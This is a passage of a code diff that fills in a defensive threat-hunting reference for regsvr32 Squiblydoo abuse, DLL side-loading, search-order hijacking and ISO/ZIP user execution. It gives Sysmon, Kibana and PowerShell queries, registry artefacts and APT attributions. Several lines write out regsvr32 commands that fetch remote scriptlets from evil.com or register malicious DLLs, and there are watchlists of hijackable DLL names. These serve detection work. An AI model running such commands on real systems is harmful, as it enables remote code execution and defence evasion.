+Cobalt Strike (Squiblydoo payload generation)
+Empire (regsvr32 stagers)
+Metasploit modules
+Custom phishing payloads
+DotNetToJScript scriptlet generators
+Various commodity malware loader chains
+
+LOLBAS reference:
+- lolbas-project.github.io/lolbas/Binaries/Regsvr32/
+- Documents Squiblydoo and other regsvr32 variants
+
+Common Squiblydoo command lines:
+- regsvr32 /s /n /u /i:http://evil.com/x.sct scrobj.dll
+- regsvr32 /s /i:http://evil.com/x.sct scrobj.dll
+- regsvr32.exe /u /n /s /i:https://evil.com/x scrobj.dll`,
+        ossdetect: `Sigma:
+- proc_creation_win_regsvr32_squiblydoo.yml
+- proc_creation_win_regsvr32_remote_scriptlet.yml
+- network_connection_win_regsvr32.yml
+
+Atomic Red Team:
+- T1218.010 Test #1 (Squiblydoo - remote .sct)
+- T1218.010 Test #2 (Squiblydoo - local .sct)
+
+Hayabusa:
+- Squiblydoo detection rules
+- RegSvr32RemoteUrl rules
+- High-fidelity (no legitimate use case)
+
+Velociraptor:
+- Windows.EventLogs.Sysmon
+- Windows.Forensics.SRUM (network connections per process)
+
+LOLBAS project:
+- lolbas-project.github.io/lolbas/Binaries/Regsvr32/
+
+Casey Smith (subTee):
+- Original Squiblydoo research and PoCs
+- Foundational reference for LOLBin abuse category`,
+        notes: "Squiblydoo is one of the most well-documented LOLBin techniques and remains effective in environments where AppLocker or WDAC has not been specifically tuned to block regsvr32 with remote scriptlet arguments. The technique works because regsvr32.exe is Microsoft-signed, scrobj.dll is Microsoft-signed, and the inline scriptlet content runs inside regsvr32's process context - none of the default Application Whitelisting checks catch this chain. The detection is high-fidelity because legitimate regsvr32 usage virtually never involves the /i: flag with a URL or scrobj.dll. The classic pattern is so distinctive (URL + scrobj.dll in the same command line) that a single Sysmon EID 1 rule with no further tuning catches the vast majority of Squiblydoo invocations. Worth noting: AppLocker can be specifically configured to block this technique by denying regsvr32 outbound network access or denying scrobj.dll specifically - but most environments don't do this by default. The technique pre-dates ATT&CK itself and Casey Smith's 2016 disclosure remains the canonical reference.",
+        apt: [
+          { cls: "apt-mul", name: "Casey Smith Research", note: "Original Squiblydoo disclosure, 2016 - foundational LOLBin abuse research." },
+          { cls: "apt-cn", name: "APT32", note: "Squiblydoo-style regsvr32 abuse documented in Southeast Asian operations." },
+          { cls: "apt-mul", name: "Commodity Malware", note: "Trickbot, IcedID, and various loaders have used regsvr32-based delivery." },
+          { cls: "apt-mul", name: "Red Teams", note: "Squiblydoo remains a standard LOLBin demonstration in red team toolkits." },
+          { cls: "apt-mul", name: "Phishing Operators", note: "Remote scriptlet execution via regsvr32 documented across multiple commodity phishing campaigns." }
+        ],
+        cite: "MITRE ATT&CK T1218.010"
+      },
+      {
+        sub: "T1218.010 - regsvr32.exe Loading DLL from Suspicious Path",
+        indicator: "regsvr32.exe registering or unregistering a DLL from user-writable path - non-Squiblydoo abuse pattern",
+        sysmon: `EventID=1
+Image=*\\regsvr32.exe
+CommandLine matches:
+  *\\AppData\\* OR *\\Temp\\*
+  OR *\\ProgramData\\* OR *\\Users\\Public\\*
+  OR *\\Downloads\\*
+AND CommandLine does NOT match: *scrobj.dll*
+  (Squiblydoo covered in previous indicator)
+
+// Unsigned DLL loaded by regsvr32:
+EventID=7 (Image Load)
+Image=*\\regsvr32.exe
+Signed=false`,
+        kibana: `// regsvr32 with DLL in suspicious path (excluding Squiblydoo)
+winlog.event_id: 1
+AND process.name: "regsvr32.exe"
+AND process.command_line: (*\\AppData\\* OR *\\Temp\\* OR *\\ProgramData\\* OR *\\Public\\* OR *\\Downloads\\*)
+AND NOT process.command_line: *scrobj.dll*
+
+// Unsigned DLL loaded by regsvr32 (EID 7)
+winlog.event_id: 7
+AND process.name: "regsvr32.exe"
+AND file.code_signature.signed: false`,
+        powershell: `# Hunt for regsvr32 loading DLLs from suspicious paths
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=1
+} | Where-Object {
+  $_.Properties[4].Value -like '*\\regsvr32.exe' -and
+  $_.Properties[10].Value -match
+    '(AppData|Temp|ProgramData|Public|Downloads)' -and
+  $_.Properties[10].Value -notmatch 'scrobj\.dll'
+} | Select TimeCreated,
+  @{n='CmdLine';e={$_.Properties[10].Value}},
+  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
+  @{n='User';e={$_.Properties[12].Value}} |
+  Sort-Object TimeCreated -Descending
+
+# Unsigned DLLs loaded by regsvr32 (EID 7)
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=7
+} | Where-Object {
+  $_.Properties[4].Value -like '*\\regsvr32.exe' -and
+  $_.Properties[13].Value -eq 'false'
+} | Select TimeCreated,
+  @{n='LoadedDLL';e={$_.Properties[5].Value}},
+  @{n='Signed';e={$_.Properties[13].Value}}`,
+        registry: `COM registration artifacts (regsvr32 default behavior):
+- regsvr32 calls DllRegisterServer in the target DLL
+- DllRegisterServer typically writes COM registration
+  data to:
+  HKLM\\SOFTWARE\\Classes\\CLSID\\{GUID}\\
+  HKCR\\CLSID\\{GUID}\\
+  HKCR\\<ProgID>\\
+- A malicious DLL's DllRegisterServer may instead
+  (or also) execute attacker code
+
+Hunt for unusual COM registrations:
+Get-ChildItem HKLM:\\SOFTWARE\\Classes\\CLSID\\ |
+  Where-Object {
+    $ip = (Get-ItemProperty $_.PSPath -Name InprocServer32 -EA SilentlyContinue).'(default)'
+    $ip -match '(AppData|Temp|ProgramData)'
+  }
+
+DLL on disk - primary forensic artifact:
+- Inspect the DLL in the regsvr32 command line
+- Check signature, entropy, exports
+- DllRegisterServer / DllUnregisterServer are the
+  conventional entry points - check if these
+  contain unusual code (not just COM registration)`,
+        tools: `Beyond Squiblydoo - other regsvr32 abuse:
+- Direct DLL registration with malicious DllRegisterServer:
+  regsvr32 C:\\Temp\\malicious.dll
+  (calls DllRegisterServer which may execute arbitrary code)
+- /u flag to unregister - same execution path:
+  regsvr32 /u C:\\Temp\\malicious.dll
+  (calls DllUnregisterServer)
+- Local .sct execution (no remote URL):
+  regsvr32 /s /i:C:\\Temp\\local.sct scrobj.dll
+  (Squiblydoo-style but with local file)
+
+Used by:
+Commodity malware loaders (various families)
+Custom payloads requiring COM registration
+Some legitimate vendor installers (false positive source)
+Cobalt Strike (regsvr32-based payload generation)
+
+LOLBAS reference:
+- lolbas-project.github.io/lolbas/Binaries/Regsvr32/`,
+        ossdetect: `Sigma:
+- proc_creation_win_regsvr32_susp_dll_path.yml
+- proc_creation_win_regsvr32_dll_from_user_path.yml
+- image_load_win_regsvr32_unsigned_dll.yml
+
+Atomic Red Team:
+- T1218.010 Test #3 (regsvr32 local DLL registration)
+- T1218.010 Test #4 (regsvr32 unsigned DLL)
+
+Hayabusa:
+- Regsvr32SuspDllPath rules
+- Regsvr32UnsignedDll detection
+
+Velociraptor:
+- Windows.EventLogs.Sysmon
+- Windows.System.DLL`,
+        notes: "This indicator complements the Squiblydoo detection by covering the other regsvr32 abuse patterns - local DLL registration with a malicious DllRegisterServer, /u unregistration as an execution trigger, and local scriptlet execution without remote fetch. The detection is path-focused: legitimate regsvr32 calls load DLLs from System32, SysWOW64, or known vendor program directories. Regsvr32 loading a DLL from AppData, Temp, ProgramData, or Public is high-confidence malicious. The unsigned DLL angle via Sysmon EID 7 is a useful complement. False positive consideration: some legitimate software installers use regsvr32 with DLLs from their installation directories (rarely from temp paths) - build allowlists from installer baselines. The /u flag deserves specific attention: adversaries sometimes use unregistration as the execution vector because it's slightly less monitored than registration, but both call into attacker-controlled DLL code.",
+        apt: [
+          { cls: "apt-cn", name: "APT41", note: "Regsvr32-based DLL execution documented across multiple sector operations." },
+          { cls: "apt-ru", name: "APT28", note: "Regsvr32 abuse with malicious DLLs documented in spearphishing operations." },
+          { cls: "apt-mul", name: "Commodity Malware", note: "Various loader families use regsvr32 for COM-registered or direct DLL execution." },
+          { cls: "apt-mul", name: "Ransomware", note: "Regsvr32-based execution documented in some ransomware staging chains." },
+          { cls: "apt-mul", name: "Red Teams", note: "Non-Squiblydoo regsvr32 abuse is standard LOLBin tradecraft." }
+        ],
         cite: "MITRE ATT&CK T1218.010"
       }
     ]
@@ -2597,17 +3387,303 @@ Dedicated injection detection tools:
     desc: "DLL side-loading, search-order hijacking, suspicious-path module loads",
     rows: [
       {
-        sub: "T1129 - Coming Soon",
-        indicator: "Full content for T1129 Shared Modules coming in next build session",
-        sysmon: "(see widget summary in build session for headline indicator)",
-        kibana: "(coming soon)",
-        powershell: "(coming soon)",
-        registry: "(coming soon)",
-        tools: "(coming soon)",
-        ossdetect: "(coming soon)",
-        notes: "Planned coverage: DLL load from %TEMP%/%APPDATA%, DLL search-order hijack pattern. 2 indicators planned. Heavily used by APT41, Lazarus.",
-        apt: [{ cls: "apt-mul", name: "Coming soon", note: "Full APT attribution in next session" }],
-        cite: "MITRE ATT&CK T1129"
+        sub: "T1129 - DLL Side-Loading via Trusted Executable",
+        indicator: "Microsoft-signed or vendor-signed binary loading an unsigned DLL from same directory - classic DLL side-loading pattern",
+        sysmon: `// EID 7 (Image Load) is the primary detection event:
+EventID=7
+Image=<known trusted binary>
+ImageLoaded=<DLL in same dir as Image, but unsigned>
+Signed=false
+
+// Common side-load target binaries to watch:
+- Original Equipment Manufacturer (OEM) tools
+- Older signed Microsoft binaries with known
+  search-order vulnerabilities
+- Vendor utilities (any signed binary copied to a
+  user-writable directory becomes a side-load risk)
+
+// Supplementary - DLL written near trusted EXE:
+EventID=11 (FileCreate)
+TargetFilename=*.dll
+TargetFilename path matches the directory of a
+  recently-executed trusted binary in a user-writable
+  location (Temp, AppData, ProgramData)`,
+        kibana: `// Primary: trusted binary loading unsigned DLL (EID 7)
+winlog.event_id: 7
+AND file.code_signature.signed: false
+AND file.path: (*\\AppData\\* OR *\\Temp\\* OR *\\ProgramData\\* OR *\\Public\\*)
+
+// Process-level filter: signed Image loading unsigned ImageLoaded
+winlog.event_id: 7
+AND process.code_signature.signed: true
+AND file.code_signature.signed: false
+AND NOT process.executable: ("C:\\\\Windows\\\\*" OR "C:\\\\Program Files\\\\*" OR "C:\\\\Program Files (x86)\\\\*")
+
+// Supplementary: DLL file write to user-writable path (EID 11)
+winlog.event_id: 11
+AND file.extension: "dll"
+AND file.path: (*\\AppData\\* OR *\\Temp\\* OR *\\ProgramData\\* OR *\\Public\\*)`,
+        powershell: `# Hunt for unsigned DLL loads by signed processes from user paths (EID 7)
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=7
+} | Where-Object {
+  $_.Properties[13].Value -eq 'false' -and
+  $_.Properties[4].Value -match
+    '(AppData|Temp|ProgramData|Public|Downloads)'
+} | Select TimeCreated,
+  @{n='LoadingProcess';e={($_.Properties[4].Value -split '\\\\')[-1]}},
+  @{n='LoadedDLL';e={$_.Properties[5].Value}},
+  @{n='DLLSigned';e={$_.Properties[13].Value}},
+  @{n='ProcessPath';e={$_.Properties[4].Value}} |
+  Sort-Object TimeCreated -Descending
+
+# Hunt for DLLs dropped near signed binaries (EID 11)
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=11
+} | Where-Object {
+  $_.Properties[0].Value -match '\.dll$' -and
+  $_.Properties[0].Value -match
+    '(AppData|Temp|ProgramData|Public|Downloads)'
+} | Select TimeCreated,
+  @{n='DroppedDLL';e={$_.Properties[0].Value}},
+  @{n='CreatingProcess';e={$_.Properties[5].Value}}`,
+        registry: `Windows DLL search order (simplified):
+1. Directory of the loading executable (highest priority)
+2. C:\\Windows\\System32
+3. C:\\Windows\\System
+4. C:\\Windows
+5. Current working directory
+6. Directories in PATH environment variable
+
+KnownDLLs registry (immune to search-order hijack):
+HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs
+- DLLs listed here are always loaded from System32
+- Adding entries protects against side-loading
+- (Requires admin to modify; defensive measure)
+
+DLL artifacts to investigate:
+- File signature check:
+  Get-AuthenticodeSignature <dll_path>
+- Compare DLL filename against known Microsoft DLLs
+- Many side-load DLLs use names like version.dll,
+  msvcr100.dll, wininet.dll - common system DLL names
+  that signed apps frequently import
+
+Side-load chain artifacts:
+- The trusted executable copied to user-writable path
+- The malicious DLL dropped alongside it
+- Both files created around the same time
+  (Sysmon EID 11 timestamps for correlation)`,
+        tools: `Common side-load target binaries (historical):
+- gup.exe (Notepad++ updater - older versions)
+- Various Cisco / VMware / Microsoft signed utilities
+- Older signed Microsoft binaries with documented
+  search-order vulnerabilities
+
+Side-load DLL generation tools:
+- Koppeling (Justin Bui - DLL side-load helper)
+- PEzor (PE encrypter that supports side-load wrappers)
+- Custom proxy DLL builders
+
+Threat actors known for heavy side-loading:
+- PlugX malware family (extensive side-load use)
+- APT41 / Winnti family (side-load tradecraft signature)
+- ShadowPad (side-load via signed legitimate binaries)
+- Various China-nexus operators
+
+Detection note: side-loading is one of the favored
+techniques of China-nexus APT groups specifically.
+A signed binary in a user-writable directory loading
+an unsigned DLL from that same directory is a high-
+confidence APT41/PlugX-style intrusion indicator.`,
+        ossdetect: `Sigma:
+- image_load_win_susp_unsigned_dll_load.yml
+- image_load_win_susp_dll_load_from_temp.yml
+- file_event_win_dll_in_user_dir_with_signed_exe.yml
+
+Atomic Red Team:
+- T1574.001 (DLL Search Order Hijacking - related)
+- T1574.002 (DLL Side-Loading - same conceptual technique)
+
+Hayabusa:
+- DLLSideLoadingFromUserDir rules
+- UnsignedDLLLoadedByTrustedExe detection category
+
+Velociraptor:
+- Windows.Detection.DLLSideloading
+  (dedicated artifact for side-load hunting)
+- Windows.System.DLL
+
+LOLBAS project:
+- lolbas-project.github.io/lolbas/
+  (lists binaries with known side-load potential)`,
+        notes: "DLL side-loading is conceptually distinct from DLL injection - in injection, the adversary runs code in an existing process via API calls. In side-loading, the adversary tricks a trusted process into loading a malicious DLL through the normal Windows DLL search order. The result is a fully-trusted-looking process running attacker code with the trusted binary's signature inheriting to the loaded DLL's behavior from a process-trust perspective. The detection pattern is path-and-signature focused: a signed executable in a user-writable directory loading an unsigned DLL from that same directory is the canonical side-load chain. False positives: some legitimate software does run from temp directories with bundled DLLs (installers, portable apps) - signature checking on both the executable and DLL helps, but signed installers may bundle their own signed DLLs that look legitimate. The strongest signal is the combination: signed EXE in user-writable path + adjacent unsigned DLL with a system-sounding name (version.dll, wininet.dll, dwmapi.dll). This pattern is heavily used by China-nexus operators - APT41, PlugX, ShadowPad all use it as standard tradecraft.",
+        apt: [
+          { cls: "apt-cn", name: "APT41", note: "DLL side-loading is signature tradecraft - extensively documented across multiple sector operations." },
+          { cls: "apt-cn", name: "PlugX", note: "Built around DLL side-loading via signed legitimate binaries - the canonical example of this technique." },
+          { cls: "apt-cn", name: "ShadowPad", note: "Side-loading via signed binaries documented across long-running espionage operations." },
+          { cls: "apt-cn", name: "Winnti", note: "Side-loading techniques shared across the broader Winnti / APT41 ecosystem." },
+          { cls: "apt-mul", name: "China-nexus APTs", note: "DLL side-loading is the most common single technique signature for China-nexus APT operations." }
+        ],
+        cite: "MITRE ATT&CK T1129, T1574.002"
+      },
+      {
+        sub: "T1129 - DLL Search Order Hijacking",
+        indicator: "Unsigned DLL placed in earlier search-order location than a legitimate system DLL - exploits Windows DLL resolution order",
+        sysmon: `// EID 7 (Image Load) showing unexpected DLL path:
+EventID=7
+Image=<any process>
+ImageLoaded=<DLL with system name but non-system path>
+Signed=false
+
+// Common hijack target DLL names (system names
+// frequently imported by application code):
+- version.dll
+- wininet.dll
+- dwmapi.dll
+- profapi.dll
+- cryptbase.dll
+- iphlpapi.dll
+- secur32.dll
+
+// Supplementary - DLL written to application directory:
+EventID=11
+TargetFilename matches system DLL name above
+TargetFilename path = application install directory
+  (not C:\\Windows\\System32)`,
+        kibana: `// Suspicious DLL load: system DLL name from non-system path
+winlog.event_id: 7
+AND file.name: ("version.dll" OR "wininet.dll" OR "dwmapi.dll" OR "profapi.dll" OR "cryptbase.dll" OR "iphlpapi.dll" OR "secur32.dll" OR "winhttp.dll")
+AND NOT file.path: ("C:\\\\Windows\\\\System32\\\\*" OR "C:\\\\Windows\\\\SysWOW64\\\\*")
+AND file.code_signature.signed: false
+
+// Supplementary: system-named DLL dropped to app directory
+winlog.event_id: 11
+AND file.name: ("version.dll" OR "wininet.dll" OR "dwmapi.dll" OR "profapi.dll" OR "cryptbase.dll")
+AND NOT file.path: ("C:\\\\Windows\\\\System32\\\\*" OR "C:\\\\Windows\\\\SysWOW64\\\\*")`,
+        powershell: `# Hunt for system-named DLLs loaded from non-system paths
+$hijackTargets = @(
+  'version.dll','wininet.dll','dwmapi.dll',
+  'profapi.dll','cryptbase.dll','iphlpapi.dll',
+  'secur32.dll','winhttp.dll','userenv.dll'
+)
+
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=7
+} | Where-Object {
+  $dllName = ($_.Properties[5].Value -split '\\\\')[-1]
+  $hijackTargets -contains $dllName -and
+  $_.Properties[5].Value -notmatch '(System32|SysWOW64)' -and
+  $_.Properties[13].Value -eq 'false'
+} | Select TimeCreated,
+  @{n='LoadingProcess';e={($_.Properties[4].Value -split '\\\\')[-1]}},
+  @{n='LoadedDLL';e={$_.Properties[5].Value}},
+  @{n='DLLSigned';e={$_.Properties[13].Value}} |
+  Sort-Object TimeCreated -Descending
+
+# Hunt for system DLL names dropped to non-system paths (EID 11)
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=11
+} | Where-Object {
+  $fileName = ($_.Properties[0].Value -split '\\\\')[-1]
+  $hijackTargets -contains $fileName -and
+  $_.Properties[0].Value -notmatch '(System32|SysWOW64)'
+} | Select TimeCreated,
+  @{n='File';e={$_.Properties[0].Value}},
+  @{n='CreatingProcess';e={$_.Properties[5].Value}}`,
+        registry: `KnownDLLs protection (hijack-immune):
+HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs
+- DLLs listed here load from System32 regardless of
+  search order - protection against search-order hijack
+- Common defensive hardening: add commonly-hijacked
+  DLL names (version.dll, dwmapi.dll, etc.) to this list
+
+DLL Safe Search Mode:
+HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\
+  SafeDllSearchMode = 1 (REG_DWORD)
+- Enabled by default since Windows XP SP2
+- Removes current working directory from early
+  in the search order
+
+Investigation of suspected hijack:
+- Find the loading process: which application
+  loaded the suspicious DLL?
+- Was the trusted executable also dropped to the
+  same directory? (Indicates side-load chain rather
+  than pure search-order hijack)
+- Compare loaded DLL hash against legitimate
+  System32 version - confirms hijack via mismatch
+
+Manifest files and side-by-side assemblies:
+- C:\\Windows\\WinSxS\\ - protects against some hijacks
+- Application manifest can specify exact DLL versions
+  reducing search-order attack surface`,
+        tools: `Search order hijacking techniques:
+- Phantom DLL Hijacking:
+  Drop a DLL the application tries to load but
+  Windows doesn't have - the application loads it
+  from CWD or app dir instead
+- Search Order Hijacking:
+  Drop a DLL earlier in the search order than the
+  legitimate one - app loads malicious version
+- DLL Proxying:
+  Malicious DLL exports same functions as legitimate
+  one, loads the legitimate one internally, passes
+  calls through after running attacker code
+
+Generators:
+- Spartacus (Wietze Beukema):
+  Hunts for DLL hijack opportunities in installed apps
+- PE-bear / CFF Explorer for DLL export analysis
+- DLLProxy framework for proxy DLL generation
+
+DLL hijacking research:
+- "Hijack Libs" project (hijacklibs.net):
+  Comprehensive database of known hijackable DLLs
+- Wietze Beukema's research on DLL hijacking surface
+
+Used by:
+APT41, China-nexus operators (heavily)
+PlugX / ShadowPad (signature tradecraft)
+Various espionage operators favoring stealth
+Some commodity malware loaders`,
+        ossdetect: `Sigma:
+- image_load_win_dll_hijack_system_name.yml
+- image_load_win_susp_dll_name_from_non_system.yml
+- file_event_win_dll_hijack_drop.yml
+
+Atomic Red Team:
+- T1574.001 (DLL Search Order Hijacking)
+- T1574.002 (DLL Side-Loading - closely related)
+
+Hayabusa:
+- DLLHijackSystemName rules
+- SuspiciousDLLLocationByName detection category
+
+Velociraptor:
+- Windows.Detection.DLLSideloading
+- Windows.System.DLL (DLL inventory per process)
+
+Hijack Libs project:
+- hijacklibs.net - comprehensive hijackable DLL database
+- Lists known target apps and the DLLs they search for
+
+Spartacus tool:
+- DLL hijack opportunity scanner
+- Identifies hijackable apps in your environment`,
+        notes: "DLL Search Order Hijacking is the broader category that includes DLL Side-Loading - the previous indicator (side-loading) is the specific case where the adversary brings both a trusted executable and the malicious DLL together. This indicator covers the case where the adversary drops a malicious DLL with a system name into a directory that resolves earlier in the search order than System32, causing the application to load the malicious DLL by name. The detection focuses on common hijack target DLL names (version.dll, wininet.dll, dwmapi.dll, etc.) loaded from non-system paths. False positives are lower than you might expect because the search order is well-defined and legitimate applications generally don't redistribute these system-name DLLs - if you see wininet.dll loading from C:\\ProgramData\\some-app\\, that is almost certainly malicious. Detection complement: hijacklibs.net catalogs the most commonly-hijacked DLLs by name, which is a good starting allowlist/watchlist seed. As with side-loading, this technique is heavily associated with China-nexus APT operators - PlugX, ShadowPad, and the broader APT41/Winnti ecosystem make it signature tradecraft.",
+        apt: [
+          { cls: "apt-cn", name: "APT41", note: "DLL search order hijacking is core tradecraft - documented across virtually every APT41 campaign." },
+          { cls: "apt-cn", name: "PlugX", note: "Search order hijacking with system-named DLLs is the canonical PlugX delivery pattern." },
+          { cls: "apt-cn", name: "ShadowPad", note: "Documented use of DLL hijacking via signed legitimate executables." },
+          { cls: "apt-cn", name: "APT10", note: "DLL hijacking documented in operations against managed service providers." },
+          { cls: "apt-mul", name: "China-nexus APTs", note: "Single most distinctive tradecraft pattern across Chinese state-sponsored intrusion campaigns." }
+        ],
+        cite: "MITRE ATT&CK T1129, T1574.001"
       }
     ]
   },
@@ -2617,17 +3693,328 @@ Dedicated injection detection tools:
     desc: "User clicks .exe/.lnk/.iso/.one - file launched from email or download path",
     rows: [
       {
-        sub: "T1204.002 - Coming Soon",
-        indicator: "Full content for T1204.002 User Execution coming in next build session",
-        sysmon: "(see widget summary in build session for headline indicator)",
-        kibana: "(coming soon)",
-        powershell: "(coming soon)",
-        registry: "(coming soon)",
-        tools: "(coming soon)",
-        ossdetect: "(coming soon)",
-        notes: "Planned coverage: container-type executions (ISO/IMG/VHD launching from %TEMP%), LNK files with suspicious targets. 2 indicators planned. Container types became common in 2022+ to bypass MOTW.",
-        apt: [{ cls: "apt-mul", name: "Coming soon", note: "Full APT attribution in next session" }],
-        cite: "MITRE ATT&CK T1204.002"
+        sub: "T1204.002 - Container File Execution from Suspicious Path",
+        indicator: "Process spawned from inside a mounted ISO/IMG/VHD container, or from a downloaded ZIP extraction path - post-MOTW user execution",
+        sysmon: `// Process executing from mounted ISO drive letter:
+EventID=1
+Image=[D-Z]:\\*
+ParentImage=*\\explorer.exe
+// (D: and higher = optical/removable/mounted drive)
+// Filter further: was this drive recently created
+// by an ISO mount (correlate with MountPoints2 reg key)
+
+// Process executing from extracted ZIP path:
+EventID=1
+Image=*\\AppData\\Local\\Temp\\Temp*_*\\*
+// Temp1_filename.zip, Temp2_filename.zip etc.
+// Windows Explorer creates these when user opens
+// a ZIP without explicit extraction
+ParentImage=*\\explorer.exe
+
+// Process executing from downloads:
+EventID=1
+Image=*\\Downloads\\*
+ParentImage=*\\explorer.exe
+  OR *\\chrome.exe OR *\\msedge.exe OR *\\firefox.exe`,
+        kibana: `// Process spawned from mounted drive (D: or higher)
+winlog.event_id: 1
+AND process.executable: /[D-Z]\:\\\\.*/
+AND process.parent.name: "explorer.exe"
+
+// Process from temp ZIP extraction path
+winlog.event_id: 1
+AND process.executable: *\\AppData\\Local\\Temp\\Temp*_*\\*
+AND process.parent.name: "explorer.exe"
+
+// Process from Downloads folder
+winlog.event_id: 1
+AND process.executable: *\\Downloads\\*
+AND process.parent.name: ("explorer.exe" OR "chrome.exe" OR "msedge.exe" OR "firefox.exe")`,
+        powershell: `# Hunt for process execution from mounted drives (EID 1)
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=1
+} | Where-Object {
+  $_.Properties[4].Value -match '^[D-Z]:\\\\' -and
+  $_.Properties[20].Value -match 'explorer\.exe'
+} | Select TimeCreated,
+  @{n='Image';e={$_.Properties[4].Value}},
+  @{n='CmdLine';e={$_.Properties[10].Value}},
+  @{n='User';e={$_.Properties[12].Value}} |
+  Sort-Object TimeCreated -Descending
+
+# Hunt for process execution from ZIP extraction paths
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=1
+} | Where-Object {
+  $_.Properties[4].Value -match 'AppData\\\\Local\\\\Temp\\\\Temp\d+_'
+} | Select TimeCreated,
+  @{n='Image';e={$_.Properties[4].Value}},
+  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
+  @{n='User';e={$_.Properties[12].Value}}
+
+# Hunt for execution from Downloads folder
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=1
+} | Where-Object {
+  $_.Properties[4].Value -match '\\\\Downloads\\\\'
+} | Select TimeCreated,
+  @{n='Image';e={$_.Properties[4].Value}},
+  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
+  @{n='User';e={$_.Properties[12].Value}}`,
+        registry: `Mount history (ISO/IMG container mount tracking):
+HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\
+  Explorer\\MountPoints2\\
+- Records drive letters mounted via Explorer
+- Entries appear when user double-clicks ISO/IMG
+- Persists across sessions; useful for retroactive
+  triage of when a container was opened
+
+Zone.Identifier ADS (Mark-of-the-Web):
+- Check on suspect files:
+  Get-Item file.exe -Stream Zone.Identifier
+- ZoneId=3 = downloaded from internet
+- ReferrerUrl and HostUrl fields (Win10+) show
+  where the file originated
+- MOTW is NOT inherited by files extracted from
+  ISO containers - this is why ISO delivery bypasses
+  many MOTW-based protections
+
+Recent files / jump lists:
+- %APPDATA%\\Roaming\\Microsoft\\Windows\\Recent\\
+- %APPDATA%\\Roaming\\Microsoft\\Windows\\Recent\\
+    AutomaticDestinations\\*.automaticDestinations-ms
+- Shows what files the user opened recently
+- Useful for confirming whether a specific file
+  was clicked (vs spawned by automation)
+
+Email attachment cache:
+- %APPDATA%\\Local\\Microsoft\\Windows\\
+    INetCache\\Content.Outlook\\
+- Files temporarily extracted by Outlook when
+  user previews or opens email attachments`,
+        tools: `Container delivery mechanisms (post-2022 dominant):
+- ISO files (auto-mount in Win8+, no MOTW on contents)
+- IMG files (same auto-mount behavior)
+- VHD/VHDX files (auto-mount as virtual disk)
+- 7z archives (require extraction, but no MOTW on
+  extracted contents if extracted via 7-Zip GUI)
+- Password-protected ZIPs (bypass email AV scan;
+  user must enter password, primes engagement)
+
+LNK files inside containers:
+- LNK = Windows shortcut
+- Custom icon makes it look like a document
+- Target field contains the actual command/binary
+- User sees a document icon, double-clicks, gets RCE
+
+OneNote (.one) attachments:
+- Embedded attachments inside OneNote sections
+- User prompted to "click to view"
+- File extracted to %TEMP% and executed
+- Popular phishing vector 2023-2024
+
+Common payload types in containers:
+- .exe (direct binary)
+- .lnk (shortcut to cmd/powershell/script)
+- .vbs / .js / .hta (script files)
+- .iso containing nested .lnk (post-MOTW chain)
+
+Threat actors heavily using container delivery:
+QakBot (pivoted to ISO delivery 2022)
+IcedID, Bumblebee
+Various initial access brokers
+Most commodity phishing post-macro-block`,
+        ossdetect: `Sigma:
+- proc_creation_win_susp_exec_from_iso.yml
+- proc_creation_win_susp_exec_from_zip.yml
+- proc_creation_win_susp_exec_from_downloads.yml
+- proc_creation_win_explorer_susp_child.yml
+
+Atomic Red Team:
+- T1204.002 (user execution variants)
+- T1566.001 (phishing - upstream technique)
+
+Hayabusa:
+- ExecutionFromContainerMount rules
+- ExecutionFromZipExtraction rules
+- ExecutionFromDownloadsFolder category
+
+Velociraptor:
+- Windows.EventLogs.Sysmon
+- Windows.System.MountedDevices (ISO mount history)
+- Windows.Forensics.Lnk (LNK file analysis)
+- Windows.Forensics.RecentFileCache`,
+        notes: "User Execution: Malicious File is the technique that captures 'the user clicked the thing.' The detection is largely about path context: execution from a mounted ISO drive letter, from a temp ZIP extraction directory, or from the Downloads folder all indicate a recently-acquired file being launched by the user. The explorer.exe parent context is essential - it confirms the user manually launched the file rather than some automated process. ISO mounting is the most important post-2022 delivery vector to understand: Windows auto-mounts ISO files when double-clicked, and files inside the mounted volume don't inherit the Zone.Identifier ADS from the outer ISO file. This means the actual payload runs without the 'Mark of the Web' warning that would otherwise prompt the user. The detection should pair container mount evidence (MountPoints2 registry key) with subsequent process execution from the mounted drive letter. False positives: legitimate ISO usage (software installers, OS recovery media) exists but is rare on user endpoints. Build allowlists from baseline behavior of your environment. This indicator is the host-side complement to T1566 Phishing in the Initial Access tactic - the network reference covers the delivery; this covers the execution.",
+        apt: [
+          { cls: "apt-mul", name: "QakBot", note: "Pivoted to ISO container delivery after 2022 macro block - canonical example of this technique." },
+          { cls: "apt-mul", name: "IcedID", note: "Heavy use of ISO container with nested LNK + payload chains." },
+          { cls: "apt-mul", name: "Bumblebee", note: "ISO and ZIP-based delivery with user-click execution dominant 2022-2023." },
+          { cls: "apt-mul", name: "Initial Access Brokers", note: "Container-based delivery is the standard IAB pattern post-MOTW macro block." },
+          { cls: "apt-mul", name: "Phishing Operators", note: "Universal across commodity phishing operations targeting Windows endpoints." }
+        ],
+        cite: "MITRE ATT&CK T1204.002, T1566.001"
+      },
+      {
+        sub: "T1204.002 - LNK File with Suspicious Target",
+        indicator: "User-launched LNK shortcut with target invoking cmd/powershell or pointing to a script file - common phishing primitive",
